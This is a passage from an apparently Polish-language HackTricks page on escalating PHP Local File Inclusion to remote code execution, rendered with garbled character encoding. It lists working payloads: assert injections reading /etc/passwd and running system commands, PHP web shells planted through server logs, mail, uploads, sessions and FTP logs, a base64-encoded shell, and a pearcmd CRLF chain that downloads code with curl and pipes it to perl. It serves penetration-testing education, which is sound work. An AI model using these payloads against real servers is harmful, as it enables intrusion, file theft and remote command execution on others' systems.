* [glob://](https://www.php.net/manual/en/wrappers.glob.php) â€” ZnajdÅº nazwy Å›cieÅ¼ek pasujÄ…ce do wzoru (Nie zwraca nic drukowalnego, wiÄ™c nie jest tu naprawdÄ™ przydatne)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) â€” Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) â€” Strumienie audio (Nieprzydatne do odczytu dowolnych plikÃ³w)

## LFI przez 'assert' PHP

Ryzyko Local File Inclusion (LFI) w PHP jest szczegÃ³lnie wysokie w przypadku funkcji 'assert', ktÃ³ra moÅ¼e wykonywaÄ‡ kod w ramach ciÄ…gÃ³w. Jest to szczegÃ³lnie problematyczne, jeÅ›li dane wejÅ›ciowe zawierajÄ…ce znaki przechodzenia przez katalogi, takie jak "..", sÄ… sprawdzane, ale nie sÄ… odpowiednio oczyszczane.

Na przykÅ‚ad, kod PHP moÅ¼e byÄ‡ zaprojektowany w celu zapobiegania przechodzeniu przez katalogi w ten sposÃ³b:
```bash
assert("strpos('$file', '..') === false") or die("");
```
ChociaÅ¼ to ma na celu zatrzymanie traversalu, niezamierzenie tworzy wektor dla wstrzykiwania kodu. Aby wykorzystaÄ‡ to do odczytu zawartoÅ›ci pliku, atakujÄ…cy mÃ³gÅ‚by uÅ¼yÄ‡:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Podobnie, do wykonywania dowolnych poleceÅ„ systemowych, moÅ¼na uÅ¼yÄ‡:
```plaintext
' and die(system("id")) or '
```
To waÅ¼ne, aby **zakodowaÄ‡ te Å‚adunki URL**.

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hackerami i Å‚owcami bÅ‚Ä™dÃ³w!

**WglÄ…d w Hacking**\
ZaangaÅ¼uj siÄ™ w treÅ›ci, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania zwiÄ…zane z hackingiem

**AktualnoÅ›ci Hackingowe w Czasie Rzeczywistym**\
BÄ…dÅº na bieÅ¼Ä…co z dynamicznym Å›wiatem hackingu dziÄ™ki aktualnym wiadomoÅ›ciom i wglÄ…dom

**Najnowsze OgÅ‚oszenia**\
BÄ…dÅº informowany o najnowszych programach bug bounty oraz istotnych aktualizacjach platformy

**DoÅ‚Ä…cz do nas na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hackerami juÅ¼ dziÅ›!

## PHP Blind Path Traversal

{% hint style="warning" %}
Ta technika jest istotna w przypadkach, gdy **kontrolujesz** **Å›cieÅ¼kÄ™ pliku** funkcji **PHP**, ktÃ³ra **uzyskuje dostÄ™p do pliku**, ale nie zobaczysz zawartoÅ›ci pliku (jak proste wywoÅ‚anie **`file()`**), ale zawartoÅ›Ä‡ nie jest wyÅ›wietlana.
{% endhint %}

W [**tym niesamowitym poÅ›cie**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) wyjaÅ›niono, jak moÅ¼na naduÅ¼yÄ‡ Å›lepÄ… traversjÄ™ Å›cieÅ¼ki za pomocÄ… filtra PHP, aby **wyekstrahowaÄ‡ zawartoÅ›Ä‡ pliku za pomocÄ… bÅ‚Ä™dnego oracle**.

PodsumowujÄ…c, technika polega na uÅ¼yciu **kodowania "UCS-4LE"**, aby zawartoÅ›Ä‡ pliku byÅ‚a tak **duÅ¼a**, Å¼e **funkcja PHP otwierajÄ…ca** plik spowoduje **bÅ‚Ä…d**.

NastÄ™pnie, aby wyciekÅ‚ pierwszy znak, uÅ¼ywany jest filtr **`dechunk`** wraz z innymi, takimi jak **base64** lub **rot13**, a na koÅ„cu uÅ¼ywane sÄ… filtry **convert.iconv.UCS-4.UCS-4LE** i **convert.iconv.UTF16.UTF-16BE**, aby **umieÅ›ciÄ‡ inne znaki na poczÄ…tku i je wyciekowaÄ‡**.

**Funkcje, ktÃ³re mogÄ… byÄ‡ podatne**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (tylko cel odczytu z tym)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

SzczegÃ³Å‚y techniczne znajdziesz w wspomnianym poÅ›cie!

## LFI2RCE

### Zdalne WÅ‚Ä…czenie Pliku

WyjaÅ›nione wczeÅ›niej, [**Å›ledÅº ten link**](./#remote-file-inclusion).

### Poprzez plik dziennika Apache/Nginx

JeÅ›li serwer Apache lub Nginx jest **podatny na LFI**, wewnÄ…trz funkcji include moÅ¼esz sprÃ³bowaÄ‡ uzyskaÄ‡ dostÄ™p do **`/var/log/apache2/access.log` lub `/var/log/nginx/access.log`**, ustawiajÄ…c w **user agent** lub w **parametrze GET** powÅ‚okÄ™ PHP, takÄ… jak **`<?php system($_GET['c']); ?>`** i doÅ‚Ä…czajÄ…c ten plik

{% hint style="warning" %}
ZauwaÅ¼, Å¼e **jeÅ›li uÅ¼ywasz podwÃ³jnych cudzysÅ‚owÃ³w** dla powÅ‚oki zamiast **pojedynczych cudzysÅ‚owÃ³w**, podwÃ³jne cudzysÅ‚owy zostanÄ… zmodyfikowane na ciÄ…g "_**quote;**_", **PHP zgÅ‚osi bÅ‚Ä…d** w tym miejscu i **nic innego nie zostanie wykonane**.

Upewnij siÄ™ rÃ³wnieÅ¼, Å¼e **poprawnie zapisujesz Å‚adunek**, w przeciwnym razie PHP zgÅ‚osi bÅ‚Ä…d za kaÅ¼dym razem, gdy sprÃ³buje zaÅ‚adowaÄ‡ plik dziennika i nie bÄ™dziesz miaÅ‚ drugiej szansy.
{% endhint %}

MoÅ¼na to rÃ³wnieÅ¼ zrobiÄ‡ w innych dziennikach, ale **bÄ…dÅº ostroÅ¼ny**, kod wewnÄ…trz dziennikÃ³w moÅ¼e byÄ‡ zakodowany URL i to moÅ¼e zniszczyÄ‡ powÅ‚okÄ™. NagÅ‚Ã³wek **autoryzacji "basic"** zawiera "user:password" w Base64 i jest dekodowany wewnÄ…trz dziennikÃ³w. PowÅ‚oka PHP moÅ¼e byÄ‡ wstawiona w tym nagÅ‚Ã³wku.\
Inne moÅ¼liwe Å›cieÅ¼ki dziennikÃ³w:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via Email

**WyÅ›lij maila** na wewnÄ™trzne konto (user@localhost) zawierajÄ…cego twÃ³j Å‚adunek PHP, taki jak `<?php echo system($_REQUEST["cmd"]); ?>` i sprÃ³buj doÅ‚Ä…czyÄ‡ do maila uÅ¼ytkownika z Å›cieÅ¼kÄ… takÄ… jak **`/var/mail/<USERNAME>`** lub **`/var/spool/mail/<USERNAME>`**

### Via /proc/\*/fd/\*

1. PrzeÅ›lij duÅ¼o powÅ‚ok (na przykÅ‚ad: 100)
2. DoÅ‚Ä…cz [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), gdzie $PID = PID procesu (moÅ¼na wymusiÄ‡ brute force) i $FD to deskryptor pliku (moÅ¼na rÃ³wnieÅ¼ wymusiÄ‡ brute force)

### Via /proc/self/environ

Jak w pliku dziennika, wyÅ›lij Å‚adunek w User-Agent, zostanie on odzwierciedlony w pliku /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

JeÅ›li moÅ¼esz przesÅ‚aÄ‡ plik, po prostu wstrzyknij Å‚adunek powÅ‚oki do niego (np: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Aby zachowaÄ‡ czytelnoÅ›Ä‡ pliku, najlepiej wstrzyknÄ…Ä‡ do metadanych obrazÃ³w/doc/pdf

### Poprzez przesyÅ‚anie pliku Zip

PrzeÅ›lij plik ZIP zawierajÄ…cy skompresowanÄ… powÅ‚okÄ™ PHP i uzyskaj dostÄ™p:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via PHP sessions

SprawdÅº, czy strona uÅ¼ywa sesji PHP (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
W PHP te sesje sÄ… przechowywane w plikach _/var/lib/php5/sess\\_\[PHPSESSID]\_
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Ustaw cookie na `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
UÅ¼yj LFI, aby doÅ‚Ä…czyÄ‡ plik sesji PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

JeÅ›li ssh jest aktywne, sprawdÅº, ktÃ³ry uÅ¼ytkownik jest uÅ¼ywany (/proc/self/status & /etc/passwd) i sprÃ³buj uzyskaÄ‡ dostÄ™p do **\<HOME>/.ssh/id\_rsa**

### **Via** **vsftpd** _**logs**_

Logi dla serwera FTP vsftpd znajdujÄ… siÄ™ w _**/var/log/vsftpd.log**_. W scenariuszu, w ktÃ³rym istnieje luka Local File Inclusion (LFI) i moÅ¼liwy jest dostÄ™p do wystawionego serwera vsftpd, moÅ¼na rozwaÅ¼yÄ‡ nastÄ™pujÄ…ce kroki:

1. Wstrzyknij Å‚adunek PHP w pole nazwy uÅ¼ytkownika podczas procesu logowania.
2. Po wstrzykniÄ™ciu, wykorzystaj LFI, aby pobraÄ‡ logi serwera z _**/var/log/vsftpd.log**_.

### Via php base64 filter (using base64)

Jak pokazano w [tym](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) artykule, filtr PHP base64 po prostu ignoruje Non-base64. MoÅ¼esz to wykorzystaÄ‡, aby obejÅ›Ä‡ sprawdzanie rozszerzenia pliku: jeÅ›li dostarczysz base64, ktÃ³re koÅ„czy siÄ™ na ".php", po prostu zignoruje "." i doda "php" do base64. Oto przykÅ‚ad Å‚adunku:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

Ten [**artykuÅ‚**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) wyjaÅ›nia, Å¼e moÅ¼esz uÅ¼yÄ‡ **filtrÃ³w php do generowania dowolnej zawartoÅ›ci** jako wyjÅ›cia. Co zasadniczo oznacza, Å¼e moÅ¼esz **generowaÄ‡ dowolny kod php** do wÅ‚Ä…czenia **bez potrzeby zapisywania** go w pliku.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Via segmentation fault

**PrzeÅ›lij** plik, ktÃ³ry zostanie zapisany jako **tymczasowy** w `/tmp`, a nastÄ™pnie w **tej samej proÅ›bie** wywoÅ‚aj **bÅ‚Ä…d segmentacji**, a nastÄ™pnie **tymczasowy plik nie zostanie usuniÄ™ty** i moÅ¼esz go wyszukaÄ‡.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Via Nginx temp file storage

JeÅ›li znalazÅ‚eÅ› **Local File Inclusion** i **Nginx** dziaÅ‚a przed PHP, moÅ¼esz byÄ‡ w stanie uzyskaÄ‡ RCE za pomocÄ… nastÄ™pujÄ…cej techniki:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Via PHP\_SESSION\_UPLOAD\_PROGRESS

JeÅ›li znalazÅ‚eÅ› **Local File Inclusion**, nawet jeÅ›li **nie masz sesji** i `session.auto_start` jest `Off`. JeÅ›li dostarczysz **`PHP_SESSION_UPLOAD_PROGRESS`** w **danych POST multipart**, PHP **wÅ‚Ä…czy sesjÄ™ dla Ciebie**. MoÅ¼esz to wykorzystaÄ‡, aby uzyskaÄ‡ RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Via temp file uploads in Windows

JeÅ›li znalazÅ‚eÅ› **Local File Inclusion** i serwer dziaÅ‚a w **Windows**, moÅ¼esz uzyskaÄ‡ RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Via `pearcmd.php` + URL args

Jak [**wyjaÅ›niono w tym poÅ›cie**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), skrypt `/usr/local/lib/phppearcmd.php` istnieje domyÅ›lnie w obrazach docker php. Co wiÄ™cej, moÅ¼liwe jest przekazywanie argumentÃ³w do skryptu za pomocÄ… URL, poniewaÅ¼ wskazano, Å¼e jeÅ›li parametr URL nie ma `=`, powinien byÄ‡ uÅ¼yty jako argument.

NastÄ™pujÄ…ce Å¼Ä…danie tworzy plik w `/tmp/hello.php` z zawartoÅ›ciÄ… `<?=phpinfo()?>`:

{% code overflow="wrap" %}
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
{% endcode %}

NastÄ™pujÄ…ce wykorzystuje lukÄ™ CRLF do uzyskania RCE (z [**tutaj**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Via phpinfo() (file\_uploads = on)

JeÅ›li znalazÅ‚eÅ› **Local File Inclusion** i plik ujawniajÄ…cy **phpinfo()** z file\_uploads = on, moÅ¼esz uzyskaÄ‡ RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

JeÅ›li znalazÅ‚eÅ› **Local File Inclusion** i **moÅ¼esz wyeksfiltrowaÄ‡ Å›cieÅ¼kÄ™** do pliku tymczasowego, ALE **serwer** **sprawdza**, czy **plik do doÅ‚Ä…czenia ma znaczniki PHP**, moÅ¼esz sprÃ³bowaÄ‡ **obejÅ›Ä‡ to sprawdzenie** za pomocÄ… tego **Race Condition**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Via eternal waiting + bruteforce

JeÅ›li moÅ¼esz naduÅ¼yÄ‡ LFI, aby **przesÅ‚aÄ‡ pliki tymczasowe** i sprawiÄ‡, Å¼e serwer **zawiesi** wykonanie PHP, moÅ¼esz wtedy **bruteforce'owaÄ‡ nazwy plikÃ³w przez godziny**, aby znaleÅºÄ‡ plik tymczasowy:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### To Fatal Error

JeÅ›li doÅ‚Ä…czysz ktÃ³rykolwiek z plikÃ³w `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Musisz doÅ‚Ä…czyÄ‡ ten sam plik 2 razy, aby wywoÅ‚aÄ‡ ten bÅ‚Ä…d).

**Nie wiem, jak to jest przydatne, ale moÅ¼e byÄ‡.**\
_Nawet jeÅ›li spowodujesz bÅ‚Ä…d krytyczny PHP, przesÅ‚ane pliki tymczasowe sÄ… usuwane._

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## References

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hackerami i Å‚owcami bugÃ³w!

**Hacking Insights**\
ZaangaÅ¼uj siÄ™ w treÅ›ci, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania zwiÄ…zane z hackingiem

**Real-Time Hack News**\
BÄ…dÅº na bieÅ¼Ä…co z dynamicznym Å›wiatem hackingu dziÄ™ki wiadomoÅ›ciom i spostrzeÅ¼eniom w czasie rzeczywistym

**Latest Announcements**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi nagrodami za bÅ‚Ä™dy i istotnymi aktualizacjami platformy

**DoÅ‚Ä…cz do nas na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hackerami juÅ¼ dziÅ›!

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do repozytoriÃ³w** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
